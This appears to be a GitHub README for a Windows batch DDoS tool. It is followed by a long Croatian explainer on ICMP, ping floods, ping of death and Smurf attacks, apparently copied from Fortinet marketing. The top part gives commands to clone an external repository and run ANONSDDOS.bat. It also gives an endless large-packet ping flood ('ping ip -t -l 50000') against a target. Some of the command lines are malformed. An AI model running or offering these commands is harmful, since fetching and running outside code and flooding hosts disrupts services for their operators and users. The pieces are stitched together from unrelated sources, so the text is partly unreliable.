# Ddos-Bat-Windos-Ping

#Windos 7,8,9,10,11.

```
ssh hostUser Or ip dynamic Server@ip -p 22 & 
cd Desktop & 
winget install --id Git.Git -e --source winget & 
Start git
git clone https://github.com/AnonsKrekerDarkerAnonymous/Ddos-Bat-Windos & 
cd Ddos-Bat-Windos & 
start ANONSDDOS.bat 
```
```
ssh hostUser Or ip dynamic Server@ip -p 22 & 
ping 127.0.0.1 -n 5 -w 1000
ping ip -t -l 50000
```

|DDoS|Ping|
|----|----|
|10000|50000|

Što je Ping napada smrti?
Ping smrti oblik je napada uskraćivanja usluge (DoS) koji se događa kada se napadač sruši, destabilizira ili zamrzne računala ili usluge ciljajući ih prevelikim paketima podataka. Ovaj oblik DoS napada obično cilja i iskorištava naslijeđene slabosti koje su organizacije možda zakrpale.

Neraspakirani sustavi također su u opasnosti od ping poplava, koje ciljaju sustave preopterećujući ih ping porukama Protokola internetske kontrolne poruke (ICMP).
Što je protokol internetske kontrolne poruke (ICMP)?
Internet Control Message Protocol (ICMP) je protokol koji uređaji unutar mreže koriste za komunikaciju problema s prijenosom podataka. U ovoj ICMP definiciji, jedan od primarnih načina na koji se koristi ICMP je utvrditi dolaze li podaci do odredišta iu pravo vrijeme. To čini ICMP važnim aspektom procesa izvješćivanja o pogreškama i testiranja kako bi se vidjelo koliko dobro mreža prenosi podatke. Međutim, može se koristiti i za izvođenje distribuiranih napada uskraćivanja usluge (DDoS).

Način na koji ICMP radi u mrežnoj komunikaciji sličan je komunikaciji koja se događa između stolarske zgrade kuće i trgovine za poboljšanje doma. Trgovina šalje klinove, podne daske, krovne materijale, izolaciju i još mnogo toga, pod pretpostavkom da svaka komponenta stigne i to pravim redoslijedom.

Na primjer, kada stolar počne graditi zid, on podnosi zahtjev za 28 2x4s, 10 funti čavala i vrata. Prvo mora srediti nokte, 2x4s sekundu, a vrata posljednja. Trgovina za poboljšanje doma šalje ih tim redoslijedom, ali vrata stižu prva. To neće uspjeti jer ne možete objesiti vrata bez da prvo podignete zid. Tako stolar traži od trgovine da ponovno pošalje nokte i 2x4s, a trgovina ih ponovno pošalje, govoreći vozaču da krene drugim putem.

ICMP radi kao komunikacija između stolara i trgovine. Prenosi poruke primatelja pošiljatelju o podacima koji su trebali stići. Ako podaci ili ne dođu do primatelja ili su primljeni pogrešnim redoslijedom, ICMP obavještava pošiljatelja kako bi se podaci mogli zamjeriti. Na taj je način ICMP jednostavno protokol za komuniciranje informacija o podacima, ali ne upravlja samim podacima.

Također, nema vlastitu razinu unutar modela Open Systems Interconnection (OSI), koji ocrtava sedam slojeva uključenih u mrežne prijenose. Razumijevanje ICMP-a može vam pomoći da vidite zašto je to tako vrijedan alat, ali također je važno razumjeti kako se ICMP može koristiti u DDoS napadima koji mogu ugroziti organizaciju.

Za što se koristi ICMP?
Upotreba ICMP-a broj jedan je za prijavljivanje pogrešaka. Kad god su dva uređaja povezana putem interneta, ICMP se može koristiti za stvaranje pogrešaka koje mogu prijeći s uređaja za primanje na uređaj za slanje ako neki podaci nisu stigli kako se očekivalo. Na primjer, izuzetno veliki paketi podataka mogu biti preveliki za upravljanje usmjerivačem. U tom slučaju usmjerivač će odbaciti podatkovni paket i prenijeti ICMP poruku pošiljatelju koji ga obavještava o problemu.

Još jedna uobičajena upotreba ICMP-a je kao dijagnostički alat za procjenu performansi mreže. I traceroute i ping koriste ICMP. Traceroute i ping poruke su poslane u vezi s tim jesu li podaci uspješno preneseni. Kada se koristi traceroute, uređaji kroz koje je paket podataka prošao da bi došao do odredišta prikazuju se u izvješću. To uključuje fizičke usmjerivače koji su obrađivali podatke.

Trag također vam govori koliko je vremena trebalo da podaci prijeđu s jednog uređaja na drugi. Svaki put kada podaci idu između usmjerivača, putovanje se naziva skok. Informacije otkrivene tragovima mogu se koristiti za otkrivanje koji uređaji duž rute uzrokuju kašnjenja.

Ping je sličan tragovima, ali jednostavniji. Izvještava koliko je vremena potrebno da podaci idu između dvije točke. ICMP olakšava ping jer se tijekom postupka pinga koriste ICMP zahtjev za odjekom i odgovor na jeku.

ICMP se također koristi za nanošenje štete mrežnim performansama. To se radi pomoću ICMP poplave, napada Štrumfa i pinga smrtnih napada koji preplavljuju uređaj na mreži i sprječavaju normalnu funkcionalnost.

Kako funkcionira ICMP?
ICMP se razlikuje od verzije 6 ili IPv6 internetskog protokola (IP) po tome što nije povezan s Protokolom kontrole prijenosa (TCP) ili Protokolom korisničkog datagrama (UDP). Kao rezultat toga, nema potrebe da se uređaj poveže s drugim prije slanja ICMP poruke.

Na primjer, u TCP-u, dva uređaja koja komuniciraju prvo se upuštaju u rukovanje koje poduzima nekoliko koraka. Nakon završetka rukovanja, podaci se mogu prenijeti s pošiljatelja na primatelja. Te se informacije mogu uočiti pomoću alata kao što je tcpdump.

ICMP je drugačiji. Veza nije uspostavljena. Poruka se jednostavno šalje. Također, za razliku od TCP-a i UDP-a, koji diktiraju portove na koje se šalju informacije, u ICMP poruci nema ničega što ga usmjerava na određeni priključak na uređaju koji će ga primiti.

Kako se ICMP koristi u DDoS napadima?
U DDoS napadu, ICMP se obično koristi na nekoliko različitih načina: kroz ICMP napad poplave, ping smrtonosnog napada ili napad Štrumfa.

U ICMP napadu poplave, napadač pokušava poslati toliko pingova da uređaj koji se cilja ne može podnijeti sve ICMP pakete zahtjeva za odjekom. Budući da svaki paket zahtijeva obradu i odgovor, to iscrpljuje resurse uređaja, sprječavajući legitimne korisnike da ih uređaj poslužuje.

Ping napada smrti uključuje napadača koji šalje izuzetno veliki ping na uređaj koji ne može podnijeti pingove te veličine. Stroj se tada može srušiti ili zamrznuti. Paket podataka je fragmentiran dok ide prema cilju, ali tijekom procesa ponovnog sastavljanja ponovno se sastavlja. Kada dođe do cilja, dolazi do prelijevanja međuspremnika, što uzrokuje kvar uređaja. Ping smrtnih napada više je opasnost za stariju opremu unutar mreže.

U napadu Štrumfa napadač prenosi ICMP paket koji ima lažnu ili lažiranu IP adresu. Kada oprema na mreži odgovori, svaki se odgovor šalje na lažnu IP adresu, a cilj je preplavljen tonom ICMP paketa. Ova vrsta napada također je obično samo problem za stariju opremu.

Kako Fortinet može pomoći
Fortinet Fortinet FortiDDoS zaštita može zaštititi vašu mrežu od zlouporabe ICMP-a u DDoS napadima. FortiDDoS ispituje ponašanje uređaja, a neobična aktivnost ICMP poruke označava se tako da se napad može zaustaviti. FortiDDoS dolazi s nadzornom pločom, profilima zaštite, globalnim postavkama i jednostavnim grafičkim korisničkim sučeljem kako bi ga učinili prikladnijim za korištenje.

Kako biste uštedjeli vrijeme i trud it tima, FortiDDoS minimizira količinu otkrivenih lažno pozitivnih rezultata. Također može ispitati stotine tisuća različitih aspekata podataka u isto vrijeme, što ga čini sveobuhvatnijim alatom protiv DDoS napada. Također, s FortiDDoS-om možete generirati detaljna izvješća i grafikone koji opisuju mrežne aktivnosti.

Najčešća pitanja
Za što se koristi ICMP?
Internet Control Message Protocol (ICMP) koristi se za prijavljivanje pogrešaka i izvođenje mrežne dijagnostike. U procesu izvješćivanja o pogreškama ICMP pošiljatelju šalje poruke s primatelja kada podaci ne dolaze onako kako bi trebali. Unutar dijagnostičkog procesa, ICMP se koristi za slanje poruka koje koriste ping i traceroute za pružanje informacija o načinu prijenosa podataka.

Je li ICMP isti kao i ping?
ICMP i ping su dvije različite stvari iako su povezane. ICMP je protokol koji kontrolira način na koji se poruke šalju između uređaja. Zahtjevi za odjekom i odgovori koje šalje ICMP protokol obično se nazivaju pingovima. Dakle, dok se ping proizvodi pomoću ICMP-a, to nije ICMP.

Kako funkcionira ICMP ping?
ICMP ping proces je način da se testira mogu li se dva uređaja na mreži međusobno povezati. Također se može koristiti za provjeru gubitka i kašnjenja paketa unutar mreže. Naredba ping prenosi zahtjev za ICMP odjekom na mrežni uređaj. Taj uređaj zatim odmah odgovara ICMP jekom. Te se podatke zatim softverom može analizirati kako bi se utvrdila kašnjenja i prenose li se podaci onako kako bi trebali biti.

